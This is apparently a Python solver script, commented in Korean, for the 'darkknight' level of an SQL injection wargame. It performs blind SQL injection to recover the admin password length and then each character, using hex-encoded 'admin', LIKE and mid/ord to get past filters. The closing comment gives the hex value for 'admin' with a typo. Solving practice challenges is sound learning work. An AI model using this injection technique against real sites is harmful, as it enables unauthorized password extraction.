import urllib3
import requests

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no=0 or id like 0x61646d696e and "
header = {"Cookie":"PHPSESSID=YOUR COOKIE VALUE"} #본인의 cookie 값을 코드에 입력

ch="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+\|"

length = 0

for i in range(0,25):
    query = "length(pw) like {}%23".format(i)
    req = requests.get(url+query, headers=header)
    #print(url+query)
    print("[+] send req length is {}".format(i))
    if "Hello admin" in req.text:
        length = i
        break

print(length)

ans=''
for i in range(1, length+1):
    for j in ch:
        query = "ord(mid(pw,{},1)) like {}%23".format(i, ord(j))
        req = requests.get(url+query, headers=header)
        print(url+query)
        if "Hello admin" in req.text:
            print("[+] find password letter is {}".format(j))
            print("the letter is {}".format(i))
            ans += j
            break

print(ans)

#0x61646d96은 admin을 16진수로 바꾼 값이다.
